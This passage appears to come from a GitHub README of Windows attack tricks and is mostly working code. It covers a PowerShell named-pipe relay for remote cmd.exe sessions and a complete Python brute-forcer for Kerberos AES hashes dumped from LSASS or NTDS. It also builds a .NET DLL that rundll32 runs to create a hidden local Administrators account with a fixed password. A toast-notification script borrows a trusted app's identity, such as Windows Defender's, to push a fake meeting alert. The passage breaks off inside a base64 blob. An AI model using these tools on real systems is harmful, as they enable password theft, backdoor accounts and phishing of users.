$pipesec.AddAccessRule($pipeacl);
$s = $true;
while($s)
{
   $pipe = new-object System.IO.Pipes.NamedPipeServerStream("cmdpipeout", "In", 2, "Byte", "None", 1024, 1024, $pipesec);
   $pipe.WaitForConnection();
   $sr = new-object System.IO.StreamReader($pipe);
   while(($data = $sr.ReadLine()) -ne $null)
   {
      if($data -eq "killme")
      {
         $sr.Dispose();
         $pipe.Dispose();
         Write-Host "Killing session";
         $s = $false;
         break;
      }
      else
      {
         Write-Host $data;
      }
   }
   $pipe.Dispose();
}
```

In the third session paste the following code.  This launches the instance of cmd.exe with redirection to the named pipes you created in the first two sessions.  Since you will not be interacting with this session it can be ignored after the command is executed.

```powershell
$host.UI.RawUI.WindowTitle = "Command Start - Noninteractive"
& cmd.exe /c "cmd.exe <\\.\pipe\cmdpipein >\\.\pipe\cmdpipeout 2>&1"
```

**Example of Using the Consoles**

The noninteractive window used to launch cmd.exe should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm03.png)

The window used to enter commands should resemble this.  Enter the keyword "killme" to exit the scripts and destroy the named pipes.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm01.png)

The window used to see the command output should resemble this.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/winrm02.png)

When you are finished using the Powershell remote sessions, you can exit each window by using `Exit-PSSession;`.

## >> Cracking Kerberos AES Hashes with Python

Kerberos AES hashes can be found in LSASS, NTDS, keytab files, etc.  This script allows you to brute force them using a dictionary file to attempt plaintext password recovery.

Create the following script named `krb-aes-crack.py`.

```python
#!/usr/bin/python3

# Kerberos AES hash brute forcer.
# Calculates aes128-cts-hmac-sha1-96 or aes256-cts-hmac-sha1-96 from plaintext strings and compares to a sample hash.
# Kerberos AES hashes can be found in LSASS, NTDS, keytab files, etc.

import sys
import argparse
import re
import hashlib
from Crypto.Cipher import AES

aes128const = bytes.fromhex("6b65726265726f737b9b5b2b93132b93")
aes256const = bytes.fromhex("6b65726265726f737b9b5b2b93132b935c9bdcdad95c9899c4cae4dee6d6cae4")
iv = b"\0" * AES.block_size

def get_hash(password, length, princ):
   kd = hashlib.pbkdf2_hmac("sha1", bytearray(password.encode('utf-8')), bytearray(princ.encode('utf-8')), 4096, length)
   if length == 16:
      cipher1 = AES.new(kd, AES.MODE_CBC, iv)
      ct1 = cipher1.encrypt(aes128const)
      return ct1.hex()
   elif length == 32:
      cipher1 = AES.new(kd, AES.MODE_CBC, iv)
      cipher2 = AES.new(kd, AES.MODE_CBC, iv)
      ct1 = cipher1.encrypt(aes256const)
      ct2 = cipher2.encrypt(ct1)
      return ct1.hex()[0:32] + ct2.hex()[0:32]

parser = argparse.ArgumentParser(description='Brute force Kerberos AES hashes against a wordlist.')
parser.add_argument('hash', metavar='<hash>', type=str.lower, help="The hash to crack in hex.")
parser.add_argument('type', metavar='<type>', type=str.lower, help="The hash type aes128 or aes256.")
parser.add_argument('user', metavar='<type>', type=str, help="The user's SAM account name (case sensitive).")
parser.add_argument('domn', metavar='<type>', type=str.upper, help="The AD domain (realm).")
parser.add_argument('dict', metavar='<dict>', type=str, help="The wordlist file.")
args = parser.parse_args()

if args.type == "aes128":
   length = 16
   if not re.fullmatch('^[a-f0-9]{32}$', args.hash):
      parser.print_help()
      sys.exit(1)
elif args.type == "aes256":
   length = 32
   if not re.fullmatch('^[a-f0-9]{64}$', args.hash):
      parser.print_help()
      sys.exit(1)
else:
   parser.print_help()
   sys.exit(1)

princ = args.domn + args.user
print("Brute forcing password...")

with open(args.dict) as file:
   for password in file:
      password = password.rstrip('\r\n')
      kh = get_hash(password, length, princ)
      if kh == args.hash:
         print("Password cracked!")
         print(password)
         sys.exit(0)
print("Password not recovered.")
sys.exit(1)
```
**Example of Using the Script**

Assume that you have an AES-256 hash taken from a domain controller for user `joeuser` in domain `DOMAIN.TEST`.  The output might look like this.

`domain.test\joeuser:aes256-cts-hmac-sha1-96:8562232c2dfc1458cc80d608deb7be53128c5a92ad8af724433e1f0daf259894`

Execute the script like so:

`krb-aes-crack.py 8562232c2dfc1458cc80d608deb7be53128c5a92ad8af724433e1f0daf259894 aes256 joeuser DOMAIN.TEST /my/wordlists/passwords.txt`

The recovered password in this example is `Pa55w0rd`.

## >> Exporting Native Functions from .NET Assemblies

This example shows how to use mono and MS .NET utilities to create a .NET DLL and export a native C++ function so it can be used with rundll32.exe.  This scenario creates a local user in the Administrators group.

**Install mono on your Linux host**

```
apt-get install mono-devel
apt-get install mono-utils
```

**Create C# source file**

This example is named `adduser.cs`.

```csharp
using System.Windows.Forms;
using System;
using System.DirectoryServices;
namespace makeuser
{
   public class adduser
   {
      public static void doadduser()
      {
         try
         {
            DirectoryEntry AD = new DirectoryEntry("WinNT://" +
            Environment.MachineName + ",computer");
            DirectoryEntry NewUser = AD.Children.Add("TestUser", "user");
            NewUser.Invoke("SetPassword", new object[] {"Te5t.Us3r.pw"});
            NewUser.Invoke("Put", new object[] {"Description", "Test User"});
            // set account active and pw never expires
            int val = 0x10000 & ~0x2;
            NewUser.Invoke("Put", new object[] {"UserFlags", val});
            NewUser.CommitChanges();
            DirectoryEntry grp;
            grp = AD.Children.Find("Administrators", "group");
            if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
            MessageBox.Show("Account Created Successfully");
         }
         catch (Exception ex)
         {
            MessageBox.Show(ex.Message);
         }
      }
   }
   public class myclass
   {
      public static void createuser()
      {
         MessageBox.Show("Adding TestUser");
         adduser.doadduser();
      }
   }
}
```

**Compile the source on Linux**

`mcs -t:library -r:System.Windows.Forms.dll -r:System.DirectoryServices -out:adduser.dll adduser.cs`

**Create an IL file from the DLL**

On Windows<br />
`ildasm.exe /out:adduser.il adduser.dll`

On Linux<br />
`monodis adduser.dll --output=adduser.il`

**Edit the adduser.il file**

Insert the `.export [1]` directive.<br />
```
    .method public static hidebysig
           default void createuser ()  cil managed
    {
        .export [1]
        // Method begins at ...
```

**Compile the DLL from the IL file**

On Windows<br />
`ilasm.exe adduser.il /DLL /X64 /output=adduser2.dll`

On Linux<br />
`ilasm /dll /output:adduser2.dll adduser.il` (for reference only, the .export directive is ignored, so use Windows ilasm.exe)

**Execute the createuser function**

`rundll32.exe adduser2.dll,createuser`

## >> Generating Alert Notifications

This is a Powershell example of generating a notification toast.  It includes an icon, text and an action button that opens a webpage.

```powershell
# Load required namespace
$null = [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime]
# Set a default AppID if we can't find one in the registry
$appid = "{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe"
# Get "Always Allowed Apps" from registry
$regkey = "Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\QuietHours\AlwaysAllowedApps"
$prefapp = @('Windows.Defender.SecurityCenter', 'Windows.Defender.MpUxDlp', 'Windows.SystemToast.Devices', 'Microsoft.Windows.ParentalControls', 'Windows.SystemToast.DeviceConsent')
$appallowed = @{}
$applist = Get-ItemProperty $regkey | Get-Member -MemberType Properties | Select -Expand Name | ?{!($_ -Match "^PS")}
Foreach($a in $applist)
{
   $v = Get-ItemPropertyValue -Path $regkey -Name $a
   $appallowed.Add($v.ToString(), "")
}
Foreach($p in $prefapp)
{
   if($appallowed.ContainsKey($p))
   {
      $appid = $p
      break
   }
}
# Set the notification title and message text
$title = "Company Meeting Notification"
$message = "Please click on the ""Instructions"" button to access the company meeting details."
# Create an alert image and HTML file
$imgfile = "$env:TEMP\alert.png"
$msgfile = "$env:TEMP\alert.html"
$imgbytes = [Convert]::FromBase64String('iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAIAAAC2BqGFAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8'`
+ 'YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAADwISURBVHhe7V0HeFTV1r1J6IKK9CaIShVFFFGKDxWkSEvP'`
+ '9J5Jb4RQBJQioohIRwQpIkgTBRs24D0VQQRFULFRk8zM7X3utPPvMxOQFoj63kPf7/72N9/NnVvX3Wft'`
+ 'tc85d0Kgv+2/Yn8D/V+yawB0OBwOhUJyIOQJiCznE8IBFaEzP/zwz5lTd/Tu9RpBLCaIBQSxZ9DAyvf3'`
+ 'KCgSUAKBoD+CIlX7/zXtGgAdiUQAaznsV4Qw/Kkc3vtxz7vWEsSbBLGGIFbUJrbEx79HxL1FEPMIQv3o'`
+ 'HQWejRqE3WK7/0XtWgEdURReQ5G3U61LCAKieEvtWi/XrftZ7SZvJ9TeGhe3OT5udTzxBkF8M2iwALvI'`
+ 'odDfQP9Ww0BHQdsw6OHtBLEtLm5DndpvJiS8kxD/KkFsTCC21q29rV7DzQkNthHEwVvugYhGWkRGQbzP'`
+ 'X9b+q0ALSEOBcMgfDiD09YSx8wniLSJ+S3zCNiLudYLYSsRthdCuX/vVOGIThHODOkfgMdzRHXYMAHPE'`
+ 'DvGXtf8q0JFwIBwIiVHQVjduspMgNtUn1teqtYWI20gQmwHluLjXEojNCQRA/32bDv+ClY/0h42DmDj+'`
+ 'po4a2/lAL2/cBNLdxvrEawm1NgMpxxGvx8XvIBIgqP/Z9KZfunT7Z+36GwjiXbMxhJA/oAHfxA7yF7Vr'`
+ 'QB3hKHV8NrX0KYJ4h4jbEZewnYjfTsTtJOI+IuIO3HDTPxs2hOh+LY54hSAOFBYD0JKmhCJ/c/TvMojP'`
+ 'zf1GTCWIJ+OJVQl1V8bXXh1f51Wi7oa4Ouvjam1ISFgXT6wmiI+GDIL490M4B3BS/OvaNQMakBZRMK/1'`
+ 'TRDXT9QinowjZhHEbIJYShArCQwxKGsQIW92aA/bCqoKhUtsv7+oXTOgBT9QArbFvXvPJIg5RNwLRNxi'`
+ 'IgGkCChrgPh1Iu5t/EkghvJrYQ1Vbf8XtWsGtBYKaoL/dNgf8JzJJ4jpBER03GwifmEc8TKuEmvtIRrs'`
+ 'IeIB6/LPP8fbn686/oIC5NpRR8yikO2a9/RkgphyQ50FRPzihNpQiL9BxO8miI/j494hiCNlRSJCKi1r'`
+ 'gaAaCgS0cFD76yXGaww0iDbMCGF+Wtv2wB7z4xJeiI9/OQ6Xix9iJ/YRxN5hSbCJhFAojIJyIBgJaaG/'`
+ 'Hl9fc6AjoRCG+qPVKydCUBPEwvi4l3DxEvd+HPE+QXxG1Hqr7o0Hn54h//ANbMYD3FCLR/56fH2tgQ5H'`
+ 'ghCeIUwhU+LqTa8bv5gglkMJDijHEbuIWjvrJOwisKAG0A+VTgSJR6ncX5GkrzVHRy0Y0uDzk43rQX5M'`
+ 'qUW8EO3P2wZei3g7nvg4ofZ7RJ2DtYh/EoT3nTep2D5/NftTAM2hiAzp7sD+0ih7zCcSXiESNhEJ+4gG'`
+ 'UC6+VYvYlxDviYv7HveaJtEQzsG/qeN3WRAHNHqizg0LQefFxYECmZ1ALI4nNhHEh/Xq/IsgjhMJ6Iam'`
+ '4VrEziY3i1Dq/C3vfqdp6Ltvv5gBXFwXi+hlUBnWitsWF7+3HvE1QXDN24V0iUKf3qeATP7RBzb/b3Qv'`
+ '1fhZ1nDDPwXQIJN/3LzFAvjWj98en7CTiP+ciPsKShUoC++7D2U6QgMG/BzNh99vf4v7D0V0OIJHy/Cg'`
+ 'RCikKeCRINT9/iCI9rAWjgTCuD9MCoXVcMgfCooCbBH0ggLSInS4Bk/+TwE0MC5TfiI3Oma4qjaxI574'`
+ 'JC7uCEEcIwipZasTCXV/JIhPQPONGgqFigZ39R8JaUgTUhip4XAwCJ/4PEF4oMEI6KJQIALaSAuEpEBY'`
+ 'CUa0SEwnhYPIHw74tZr04P4pgI4Nbb306HDIhM8nECuIuK1xcTsJYg9EcQKxqW6tJUDWT06DbTRaCMuR'`
+ 'C8rxf5MBWFA7gQcCVcuAt1/T8FLEjyJcJOgJqZUB9Qe/+pGsbaGEKbycW04ZyoWnokXXVexPAbSmqjQK'`
+ 'cho9r/vtIDwm4X4PYk60Mw/8pTu75NuMsJkY9DN+VtSEcKytAtqXAfwPDeJGUCCClEDwgKrtlLTVlDZH'`
+ 'lJ5g+fEk4yr36Uh+NAUuJFJiIklmKIqhkh0mhbbU5LlfQ6CBEIFtMS1C48T1dfR6PUeO7n5u0QZX7ofP'`
+ 'PXXi8IFZc+ZPmb/InT8+HIoWhBEUDgQD0F5DAS0YVLWQGhT9YVFDCrAlVD5Qm0ObV6PHiw1/4dYSZRuo'`
+ '9iPACVpFUPtF8x+QlV2ytFEUljP8Ez6hkKITSfoxkh5GMoNIZhRFJ9F0Ks2k04yOZvUMZ6RZE8taaNaM'`
+ 'nTFxYg7LpEiSjaNnx+7nynYNgQYG9IODgPYHBS0sh5AWDEECqoqPGO/t2/8vZ7Zj+vQpJ0+egj8DQQAr'`
+ 'BAGNHQ4BH9BsAV3AWA2igIgCDApVgovyq6ywgBNns9IMUsz1CQ6fYPWIeq+Q5OFHVbDDT5IP8ZJdEJy8'`
+ 'YGa4dIazMJyV4WDZwLDwCX9e7PS5ZdhAcDN0mihYWG569EqvYtcMaOA1iNEQDr0w5PQQQBjt9ACgAX6A'`
+ 'E+D2S3jLTGv21Mlz93z0Bgqf8Gt7g9qXsrSdl17l5ZWcvIKWS0jR4REMp5kkLzfUyz5cyfat5HpSpJ7y'`
+ '2UifwUemMoyVY+0sY2NpK3bGxjMOnnVztJ6ljRxl5mk7zRkxxAA0G4P7V3wv4wA0b6OodIG3Mdx4fJVX'`
+ 's98DNEAQC7o/aNHjQMuG3EYF/T/y3KeislsUXpXkZYr/WVkaT/qKEMpevyInr/DJNWseDQUnskpSJT2a'`
+ '41NYJolhkmkylabSGFbHsyZBsAlCJse7AUGWzeGEdI5L41gjQ9kZ3kgLBpo3kqyJBEwBdNEi+k1exuRj'`
+ 'jBRn5iQHzesYNgo07bw61qyZ4i20L4NnrIwAF3l1qxZokDLQNFW/oPihTULcBULhUACkTyQC+QIc2jzO'`
+ 'STHUwaPLUaGjhQNcWPOFtTMh7YRf+UKWP5TlbZK2XuAXCNxTPD+eFQsYuGHKQFEjSfYRkh0OtEizY2gm'`
+ 'kWJSKDaNYtIp1kDxwxlvzhl2SFHerOeenSyER4q0i+NSaMZJc2bckNmqO4dlijVVEShnwo75FK+HLXEA'`
+ 'xhzDhx02o5hfoQTOPXcohjNdBeXoMTk2mxaSWMnlo2349q9m1QINshzQxlQY4RCAHgC9I0aCbFD5TpX3'`
+ 'KfInigzJ5GVBfE6Qp/PyZFoCHrT7RJNH1Hn4dA+b4uHHVLDDKC6Z5tMpLpVkUiGmKB5iwUzyRpZzgNOc'`
+ 'nWGh9V18JzGnaANH54aQYd4C41NTFlYyqRKfCc+A4WCXq2DxH3UAmmVdNJfMipleRv+HgIZEEwyrcpBi'`
+ 'JbjDodBgK5ih5ew/POxIkkkm2WFe9iGclCmAI4PEDdnEsTYWmhJj4VgDz+k5VscwaTyj5xgTT1lZrwO2'`
+ 'IcFpi8/nYHgzy0PoWWjaCaF3KXAQdJzsIn1mUdYd+SnRpZ/65VGTomZTOGavJcrgGGjGCqHD8G4AJFpy'`
+ 'XcWqBxqke0QAKSDxrwr0GAglkXXxtJvn7BykWkgCjJ0VjLxkZAWIymxIDoxghCsgoUnywFywjZXGoWdn'`
+ 'IWxxa9VzvIXDsWBk2HSOt7KCjRf1gpzO4x2hwVqALkFFxRiAZW0eNk0QLAKdJ4WSS3KmfbDHGAgV0pKL'`
+ 'xHrr4pv/bzpmLcbqA/3HZlXyj0ap8yp2BaAjWhDPqw0FyXJuCCa1GPdFCQ48il2UBzH9xdCpIk0vlc7y'`
+ 'Foo0i5yTpUwMbYJcD0mJok2AEckawFkOko/xh+8KDuwv+e4XHafkeanhMogBIc/HWkjWSnI2H232wVOR'`
+ 'zGFkfvMd9+IFExAynj7lgOx3/m1fA8fsnwHiGkCgyFGBYAWIKDx/AopynKUuY9UDjcc+VKjrw36REiGz'`
+ '17S1wpPguGyaz6CVIWoEYtAsisk8m6zIelnIFLhskcuW2Cw/yt/xxtSN659/dd2cLWtXf7p7Fq/pPeQY'`
+ 'nnbwjBk7jT9Z2sKQNs5nO0PnPFGap6EcRh7OsnnXnD0gSqJy0AJlTiB8MoqwAjr19wAN2ksNsaC+eKmY'`
+ 'jkmfi05WjXuY9EC47JNPc1evyn1jc/G+T8adOFHk47JIQe/j0nxcOqekfvpF1ktLF23dtvSVLY+/9c7S'`
+ 'NzYv//7bZxSkp8WRgqIT5AygFEkxCLJBkPSckCZo5pcXuz1UqpfOwKRU4wf/n3E4O0hAK9Z57BAtfDQI'`
+ 'KS2kgTarrgfgCtSBJYcc9ELRJSuTY62VYnDAXnjKix0IRFTTvz2aN7HEPue5CU/OKHj6mXFz5xUvWFKw'`
+ 'csXUVctnrFw+/eXlT65+afbm1yZt3TZj02tzN7/x/Otbl3/4/rQv9005evj5rw89e+jL5w59MefA50sP'`
+ '7l92+Kv53xyZe/pk/s/H3CyXCyUZKL+LTvpf96jcrgJ6sIa+wvVWIBQKg1S7vFUP9HmmqrtPeIcwnIsX'`
+ 'jVBiXRlrANqPkl9dk/fETOecZx5/fk7BwhfKFi2YsGzxlGVLJy1fNhngXr1qxqvrntqwYfamjc++vnXu'`
+ '6xsWvPfB82/sfGnT1kVvbl32ztvLP9u38Otj88rLi2kf3I9ZUnWcYOAESJggeK9tLJ/zKrlNg+hUX4J0'`
+ 'iDtXg0FcW1zOagS0pu4up8YwvJ3lDVC/Xi2ozYpme2GOe/qsvGeeGf/83PwFL5QtXjhh6ZLHX1w2acVL'`
+ 'U2JAr3tlxoZXZ23a+MzWLXO3b3v6rbcXb3n95b1fzPSxLpKzU6KeklN8tI6k9KDnQOdE889FJ/pTOM2m'`
+ 'CupSQAn3U4eq7cGtEdBh/0EPMKMIB9UzLNZqF53sQjfLftfTTzpmzip85plxAPT850sXzB+3ZNFEiOgY'`
+ '0GtXz3jlFRzUr214esuW57ZunbF9x7LNm1765cRYRTGASuFAjNM2jtcz4CB1aBA2+MiXnOvaO82ms/LT'`
+ 'kAOBPCLhwB8CGmnfUJyFlY0Uk0FTuC1fdLILHSLaPP/5zBmzcuY8O+G5OfkvzCtdsGDckoUTX1w66aXl'`
+ 'k19eCUBPX7tmxob1szasf3rrlufWrX16x1uLt70+78ejY1UN9LiFFkACpvK4ay2T5WwkbaCgSr74RNfW'`
+ 'AQTsNKujpKkg7zQ8RPA75N15Fo4I5cwYkbFxjMNLJ19yygscc7RmfmWVu3SKfv6S2c88mzl7du6ShZOA'`
+ 'OpaunLRs5ZQXV0x/ecUzL62cvuTFyVs2zd2w7qn1b8zdtO3lN7bM8HjdnJhBQ8qtUujgWLlfdIo/gcMl'`
+ 'QS0WdVD9vB0kQxiPOuJuoSrULrQaAR2JyBVsqshBc3Z66dRLznqBAzqSbDz0VUlpwaTZz2ctnD9z0aLS'`
+ 'FxZYFi8qXDJ/2dyn5yycX7BtW8mRr8ad/OW5tWvKXlm7ZO3aFZs3zfn22ymcUEhjfXruaH9CiGN+AdA+'`
+ 'wQZlNO4mxxH9B4CGh1XJGCTBIECmYq5SlQHQrGSU1PxJRYZZz2TOmJk9/4XSuXPGP/v0k+tfde7dB8yQ'`
+ 'I4XTBekRSUwm6bGf7s395LOxJ84USQETyY9iowXnRcf88/lFQGegQCCAh3AhrP9IRAeRh7bKkk5k3T4G'`
+ 'Ss+LznqhQ3uXdYrfcfCLzKLCkqfnup6dNXnGtLE797qlsE3yW0XJLtAOFo8M6SkyJaBa1ICBZFJkJbu8'`
+ 'HNQSHORPG8jn3ExzNprFzjJ2j5CMghp+jxrSYTX6rmYRHUKknE2zKdGuH9eVgYCaTZTyPEyyEnB8+Zlz'`
+ '7qzszVsyT3sMml/HcUaagYA1RbtNonKNtYB6gzoIdoymuz8/xNghbbCsleUtUYeaRaepXwPA4YgK6qMK'`
+ 'tAutZkAHkE/KY5i0qEq/muoA7DizhzL42BQpOEYMmwVkYZV00mumqBqMEv0V/CzQMYf7TdWUQ0AZobCG'`
+ 'C5fLWY2BFkoYIA0eCrOr6miLj07hRCfN5NFQ44gWhrdKiovjbP92ifYHBUl091+PcDY3XLDysn4h0FYv'`
+ 'N1Lz7w8BPePRpz8GNCWU0bSe5g10NUDjkaToepANvJjtpQ1eLpHmXQxtZUiTlwQtYWJBIFd1qP5mlsC7'`
+ 'RAefopoP6hdoHMDysd4lnD85wRorIM86PkX0RIAL3oWtOhQswL6QDGJFUNUlQRKWlFg/EXaKNcb2uuyz'`
+ 'vBBom48b4tf2B8JQsUAJ/geADmrouKeM4zN42oW7ni89MfCyCF/ZvD48RiVJmZAlvF4TLzg4vqpkj96M'`
+ 'jY2OA4DTNRlsPuuwLyc4adHqocyCmBRBxQw/iq4oqOBSGTGTYh1aWHeqPOXYDxmMaKGgLfNmhneS8Ix5'`
+ 'eyWl43grLxlOVqZ6WKOPcZ32jPFxOl7KFFUHyZglKU+U3FzIvPtjExy2gjH4qHRVnET6jKJkYyHjXXKd'`
+ 'FwKNs4uPfQ5CORSRqhsEqBHQARX9dLqU4/Q87eC4y3dRUozZR5ko2iKIDrhugJikLCQJMXVuY4gO2Lcq'`
+ 'WZ+dRPHrEa7sXhoahJnmTaJcmpJ6x+7PHvPLbppKCspFCBUd+9nY5+4WrORm8DYWcA9t8lJGTnJRrJUk'`
+ 'DYqYq8puiXXwisHjs/NiwYkz6eFwbiTi+uLAPapsyM0c3O6meISmUXJypdeqhBJZwXTiFEisy9DdhUBD'`
+ '+Osp/lmoCUMhtQqyS6xGQGsKOnysBDQDR9sEEWC6HNCUCZQZhCpg7SVhGa7ATtLnDzabYSUIjJjHeKAa'`
+ 'v+QrUCaS1UfqQxF7SWkvgiBCqEQNQHSbEdJv2/oQQdTZuefRAHLjwTCcncyyhoclfYyZpDL9yMBJDl4e'`
+ 'JfKJggQPOF/QkhAyzXj2kS7dr39s2LDG199IEHFu591axMopxkqvnWJyvKSLlewgii6+mEuB5tIocSqE'`
+ 'cijk/0MluCqhg98U80BYpEVWoNVffG5YAxBLcibHQ8gbAkE9w5gEaJtSJlxHjFXBRcmKkNuvQaMGSRRl'`
+ 'TwCdw/ION09gRpwtgTGBJWENngIAy9HdTWwgMxyG3XO73dnCmD5Uigw7fMiydceo0if6jxrddf+h4Qhl'`
+ 'kbSOxCibBNkeRDoKKiw5C6HM0UmdahHEgUN6Rc2Bq/JSLjWc/srS1OF9myE0OYweQ2hqw0YNXTk9wshM'`
+ 'MhZoIg/0aHTwYBYTAEULJckl93sx0CmkPBGAwhNRq7EaAS0JaO+BsXLAwOI5KI5LIw5YW8Spya0g41PP'`
+ 'PgAR9/mRR4NiLkNnlHuSYS94DKrm/OfeMURci3mL7wireRST7SXTBCldYLIDARPjsVFkYiCQX0E6WNno'`
+ 'pXSSkC1rJoQyELJDjcOq6WZdj9s7Nm7R5PpmjW4liPrNGje+q/vNiSM7HT+dFowYcfnO6CRRLzAFB46M'`
+ 'GZXR78zpBwDHrNKud3Xs3KZ13JChfbRQarngUmj9SY+TIGqTgpHzZYfCpq9/SSOI68dP7oTQOGgiqWnd'`
+ '8/J6I2QVmCw45kU3G3PAOhY9kJlIZgRJZSFN9YfJ6n4pp2ZA82jP5wWK30jhuX7VqA5SX1lh4gLJYmBi'`
+ '44bXWcy9ACOGhCjTc7wLsA6EzVs2jYJnUJjfJRIEMtV5qVSBL6SkMUE0QvNP9cr9Iag99AhOTddCBXLQ'`
+ 'mJ/zcMc2LXKc/UWpcP+B0atX9X9j55Dr6td+f3e/IDKFkTuI3Coq/McDbdauAd7IqfCkMpQxgkzPzX0Q'`
+ 'TvTPj4aWV5bdWA/C1r5kZV+CaCaoxpMUVHEpUyYNatgA7t3m9bgRSk4e05EgWk2fOgAh57Sn+g7t/5CE'`
+ 'RjG8rbIyiaGzr5xLIPEwbLKXdoY1PhiRf/tQ1nnGc+idD+1KwEAzeoa7TESD+0ijIDoFxRSM2Oc8NxQC'`
+ 'hAkZFWksx5l40UWzGcGwy264nSAalxb3QmGHIudQ3hwJJR8vzynNG2CydDh0fLSqlrGUE1TEL94xjevH'`
+ 'LVrcV0RZANkMDEEi4PXlV/kE0YAi82UemouRZVPhIbW4vntecc8IcrCCk2OzQsh4752tCCJ+32cuk7nN'`
+ '8pcGQpzu+GA4HOfoj1ZJA1rP6nJ7R4OpO0J5AeRcsLz3sIEPtG5d5/kFj06a2K/L7c0RSvJWjiPpDEUD'`
+ 'Krt88j/nwGw8b6qkdQH/qVBsqtblrGZAs+iNd3RqEMg0g8EzdC45MQhSAVSHjiYzZcHwxTcjoWEuW/dg'`
+ 'IOjiKCMvGyp9yQhN6tU5vlX75s/NuwsFnJSnEKERWza4rqtNfPhJqiXrzoSE1oKQLHMOCKtH+3fX29vD'`
+ 'LmFkub5xI10qtI8SINClS+8hiHoctC08fwXOa48ga9sWTcc9e4uGXBV0mqwWrFrZr3TCgKbNGu94M7nT'`
+ 'rU3EgElh0784rCOIhp98NcwfTkdoxnWNiJLSHghNOMVAI2tyknPdcustTVrVu793F86foQg5ND2CFVNJ'`
+ '0hkdlb7wZi90nHtEezmdoinHou8BXN5qBDRFqlu35cuBJIgXTtbBM7zoZOAgSDnOAUFNM+k73tPDXd15'`
+ 'T2MhZKykzQyTJ6mW7Z/0Hfpwy1s79p6/YICspUu86dgpCPwbv/l5NELZ7+4eDE370A8ZIU1/9EfYPf7o'`
+ 'cSBo6649EMLEri9H83K2gDJhuUfn5orolkSzx+MQFTunwsa11ywfCXEq8zlS2NTipuYVtKle3duSDa0m'`
+ 'l/YPo1JVziUVB+y79VUjQsa3/jWaIG7u3LXh9Ocehutcs+5ehApaNWvbt9dNcCUMnRmdsIHzcA3GJ3Hv'`
+ 'EsukMWKqquzBHaV/REf7POLGzW4FUjDt5sTLAA1PVRCcUI/4SGiYOYteHNKyZd0b6rfa/Yk+iIykMAyh'`
+ 'ssSk9jveSmzdrsWy5UMCIQBxqtnW+f7724IOQahYb+56a7uOWngUChc+/SzwKdzztNc2JgM6G7cNCobz'`
+ 'EUovLOzR9qZOXW+7GThEC5ngSiD3+rx5BJGwYX1iIGhHSJdlveuJKY8glNbguoRaRPzJMw5atqn8wEDI'`
+ '3aD2TRZ7Vzhvp47Epu1m0HP44JtGRZC9Z5eW8LSKC/oh4B+o9OjfMEEHhADL6GkhWVJ34Bkaf6Tj/9Qp'`
+ 'at16uz+cRjMuigf2uORkrJkXnQwDlSEgmJ+Z2WPSEw/17NTi/vtuhUuXAy4Iz+uIppB82rVvlpvTKRJx'`
+ 'BlF24xsbzF02IozsdmOPJvVuYPxJfrFQDbqbNqnbsuXt93RpMnRI0x9+KQ2jjEA4e9WaAXfd2m7dxgdq'`
+ 'xTVQEbBzThAVPDXrdlEqgvDf/h4weNbCl/p1bQNPzlXucTRq2PiRfvfBso9NrTzuApawW7oRxHUA6Opl'`
+ '8Gj1sD1CT399bAQImM8OJN3Rq1Wm4y6Id5CeeFLg5VrtZR3XyVCXiYm8/yX88kvk8jMOagT08Z8r17xi'`
+ '8kfSKQqATrsUaGhBUKeAiIaSJBC0Dh3S8oVFg7ZtHwQ3tvefoFKd/Qd0Nei7gT5t3KxlQRYop6wKz6h2'`
+ '13fs1ad797viHRl9SVbn1+D+nY8M6NDr3rsh1hR1BgS7LKdAyvrg4/Ta8XUq2cJ3dg4giOYHvgbVrMu1'`
+ '9cnN7hxBWQnxTYcO7VhUcF98rdo/edI1DXjMDkcYP+EOhKCgNf5wQi+ETKe9hpLiHts/sgSQkfFAyxs7'`
+ 'dVYf2OzQESecokOHZmZDT2g3PsrFQG15ddI452baa2PE0Zz2XAjiOXz5nySqEdDffXd8yRJnGOKIc1LV'`
+ '6EqKM9CklaMhlem7dLj75dWA5vQHH6wDsmnQ6K4QdKwEQVTcrHlddx7cz1haSGx5402lk/tg6giOl1TQ'`
+ 'y7YcxwODBreskHMIotGUmbeACj7Bjsgp6A9wVJ4qBhUshQo7tIJj1gduHTK4I0KPs2jUu+9l3NrshkEP'`
+ '3kzRpoDmFsRMUTasWHT/7g9SJDWTEU0UY2QYCy9Yw8ipBtwslwZXMnd2Z4KodbyyVAwA1eTf1KjtgsX3'`
+ 'RSK5DIVl1W+IaNYM+pXjIWcWoWoHwWsG9OHDPyxbAvndSDN2APSiM8Uc6jGKMvOMXUX6xvXav75jECB4'`
+ '0lPctAVxff26n+61qcEsVbK1at00K7c3hKEY0Q8b3P+2LjcFEQQUQDDp7k7d7unVMILMQZSUkw3PhqhN'`
+ 'tK9FNBjcr3Ml7Zb9ibyg8/HOr79165J6vLJ2RAi5GMokKQ4oZ+ATSkEt6MLdVYxVEDI1BJGb7uFG0gwE'`
+ 'B+5XifXGCaJV4LJp/xiCaDljGnCLhfaMFdWSdm2ISrKIZdM8Hij2fkNE4y0FKwsLfDYKAnVUgXaR1Qjo'`
+ 'zz8/tGSJDSEzReHIvehM2OFkooWijIqYVU4aQEt89kWSImbIYaMcfpL35/qhSWI9Z2jXrq3bDQVbHhtO'`
+ '2/ttP5DVjWvf1r/vTQDrhIkgbN0cWcoxOK3tPZi9+a17f/GAJnEKXAHHm71UmiDa1DC0emMobGVpO0vZ'`
+ 'g2oRTeoUyagKYzk2kxcgHm00beaEbC9t4yRQ5WevMHqpXjKV5/IYLbnR9U2NKQ8GULIWyBn0CPHaa0mq'`
+ '38WzqTTnZPnLdDNU66yFFjJYOosUdSio/CGg//XJgaWLAWjIdWaaN16Go6EYFa00rffLuT/+kk4QdQ7/'`
+ 'lKqSOQxr8rDDODZHUh00C3ky/a5e3du0gZNOZIW8EMrad3B42cSez84Z/sMpQwjlSkIuyZjwVGvWyXM2'`
